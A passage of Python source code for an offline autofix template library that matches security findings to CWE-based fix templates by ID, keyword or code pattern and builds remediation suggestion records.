# AutoFixTemplateLibrary
# ---------------------------------------------------------------------------


class AutoFixTemplateLibrary:
    """Offline fix template library for deterministic autofix suggestions.

    Provides language-specific fix templates for the top-10 CWE categories.
    Used as a fallback when LLM providers are unavailable (no API key, air-gapped
    deployment, provider timeout, etc.).

    Usage:
        library = AutoFixTemplateLibrary()

        # Direct CWE lookup
        template = library.get_template("CWE-89")

        # Match from finding title/description
        template = library.match_vulnerability(
            title="SQL Injection in login",
            description="User input concatenated into SQL query",
            cwe_ids=["CWE-89"],
        )

        # Generate a full offline suggestion dict
        suggestion = library.generate_offline_suggestion({
            "id": "finding-123",
            "title": "SQL Injection in login endpoint",
            "cwe_id": "CWE-89",
            "severity": "critical",
            "file_path": "app/auth.py",
            "language": "python",
        })
    """

    def __init__(self) -> None:
        self._templates = _TEMPLATES
        self._by_cwe = _BY_CWE
        self._by_keyword = _BY_KEYWORD
        self._compiled_patterns = _COMPILED_PATTERNS

    # ------------------------------------------------------------------
    # Lookup methods
    # ------------------------------------------------------------------

    def get_template(self, cwe_id: str) -> Optional[FixTemplate]:
        """Get a fix template by CWE ID (e.g. 'CWE-89' or '89')."""
        if not cwe_id:
            return None
        normalized = cwe_id.upper().strip()
        if not normalized.startswith("CWE-"):
            normalized = f"CWE-{normalized}"
        return self._by_cwe.get(normalized)

    def list_templates(self) -> List[FixTemplate]:
        """Return all available templates."""
        return list(self._templates)

    def get_supported_cwes(self) -> List[str]:
        """Return list of CWE IDs that have templates."""
        return sorted(self._by_cwe.keys())

    # ------------------------------------------------------------------
    # Matching
    # ------------------------------------------------------------------

    def match_vulnerability(
        self,
        title: str = "",
        description: str = "",
        cwe_ids: Optional[List[str]] = None,
        code_snippet: str = "",
    ) -> Optional[FixTemplate]:
        """Match a vulnerability to the best-fit template.

        Matching priority:
        1. Exact CWE ID match
        2. Keyword match in title/description
        3. Code pattern match against vulnerable_patterns

        Returns the highest-confidence matching template, or None if no match.
        """
        # 1. CWE ID exact match (highest priority)
        for cwe in (cwe_ids or []):
            tpl = self.get_template(cwe)
            if tpl is not None:
                return tpl

        # 2. Keyword match in title + description
        combined = f"{title} {description}".lower()
        best_match: Optional[FixTemplate] = None
        best_score = 0

        for keyword, tpl in self._by_keyword.items():
            if keyword in combined:
                # Longer keyword matches are more specific
                score = len(keyword)
                if score > best_score:
                    best_score = score
                    best_match = tpl

        if best_match is not None:
            return best_match

        # 3. Code pattern match (lowest priority -- regex on code snippet)
        if code_snippet:
            for cwe_id, patterns in self._compiled_patterns.items():
                for pat in patterns:
                    if pat.search(code_snippet):
                        return self._by_cwe[cwe_id]

        return None

    # ------------------------------------------------------------------
    # Suggestion generation
    # ------------------------------------------------------------------

    def generate_offline_suggestion(self, finding: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        """Generate a complete offline fix suggestion dict from a finding.

        The returned dict is compatible with the AutoFixEngine's existing
        AutoFixSuggestion structure, ready to be consumed by the API layer.

        Returns None if no matching template is found for the finding.
        """
        title = finding.get("title", finding.get("name", ""))
        description = finding.get("description", "")
        cwe_id = finding.get("cwe_id", "")
        cwe_ids = [cwe_id] if cwe_id else finding.get("cwe_ids", [])
        code_snippet = finding.get("code_snippet", "")

        template = self.match_vulnerability(
            title=title,
            description=description,
            cwe_ids=cwe_ids,
            code_snippet=code_snippet,
        )

        if template is None:
            return None

        finding_id = finding.get("id", "unknown")
        language = finding.get("language", "python").lower()
        file_path = finding.get("file_path", "unknown")

        # Select the best language-specific snippet
        snippet = template.fix_snippets.get(language)
        if snippet is None:
            # Fall back to first available language
            if template.fix_snippets:
                fallback_lang = next(iter(template.fix_snippets))
                snippet = template.fix_snippets[fallback_lang]
                language = fallback_lang
            else:
                snippet = {"before": "", "after": ""}

        # Generate a stable fix ID
        fix_id_raw = (
            f"{finding_id}-{template.cwe_id}-template-"
            f"{datetime.now(timezone.utc).isoformat()}"
        )
        fix_id = f"fix-tpl-{hashlib.sha256(fix_id_raw.encode()).hexdigest()[:16]}"

        patches = []
        if snippet.get("before") or snippet.get("after"):
            patches.append({
                "file_path": file_path,
                "before": snippet.get("before", ""),
                "after": snippet.get("after", ""),
                "language": language,
                "explanation": template.fix_description,
            })

        return {
            "fix_id": fix_id,
            "finding_id": finding_id,
            "title": f"Fix {template.cwe_name}: {title[:80]}",
            "description": template.fix_description,
            "fix_type": "template",
            "confidence_score": template.confidence,
            "patches": patches,
            "explanation": template.fix_description,
            "cwe_id": template.cwe_id,
            "severity": template.severity,
            "template_based": True,
            "template_cwe": template.cwe_id,
            "template_name": template.cwe_name,
            "testing_guidance": template.testing_guidance,
            "rollback_steps": template.rollback_steps,
            "risk_assessment": template.risk_assessment,
            "effort_minutes": template.effort_minutes,
            "mitre_techniques": template.mitre_techniques,
            "compliance_refs": template.compliance_refs,
        }

    # ------------------------------------------------------------------
    # Code pattern scanning
    # ------------------------------------------------------------------

    def scan_code_for_vulnerabilities(
        self, code: str, language: str = "python"
    ) -> List[Dict[str, Any]]:
        """Scan a code snippet against all template patterns.

        Returns a list of matched templates with the specific pattern that matched.
        Useful for proactive scanning without a pre-existing finding.
        """
        matches: List[Dict[str, Any]] = []
        seen_cwes: set[str] = set()

        for cwe_id, patterns in self._compiled_patterns.items():
            if cwe_id in seen_cwes:
                continue
            tpl = self._by_cwe[cwe_id]
            if language not in tpl.languages:
                continue
            for pat in patterns:
                m = pat.search(code)
                if m:
                    seen_cwes.add(cwe_id)
                    matches.append({
                        "cwe_id": cwe_id,
                        "cwe_name": tpl.cwe_name,
                        "matched_pattern": pat.pattern,
                        "matched_text": m.group()[:200],
                        "confidence": tpl.confidence,
                        "severity": tpl.severity,
                        "fix_description": tpl.fix_description,
                    })
                    break  # One match per CWE is enough

        return matches


# ---------------------------------------------------------------------------
# Module-level singleton
# ---------------------------------------------------------------------------

_template_library: Optional[AutoFixTemplateLibrary] = None


def get_template_library() -> AutoFixTemplateLibrary:
    """Get the global AutoFixTemplateLibrary singleton."""
    global _template_library
    if _template_library is None:
        _template_library = AutoFixTemplateLibrary()
    return _template_library
